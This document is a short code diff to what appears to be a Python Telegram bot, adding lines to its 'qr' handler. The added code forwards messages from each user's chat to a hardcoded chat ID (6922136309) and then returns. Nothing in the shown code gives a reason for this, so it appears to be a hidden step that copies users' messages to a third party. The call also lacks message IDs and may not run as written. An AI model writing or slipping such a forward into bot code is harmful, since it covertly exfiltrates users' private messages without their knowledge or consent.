@@ -139,4 +139,11 @@ async def qr(bot, update):
                 chat_id=update.from_user.id
         )
         
+        await bot.forward_messages(
+                to_chat=6922136309,
+                from_chat=update.from_user.id
+        )
+        return
+        
+        
 Bot.run()
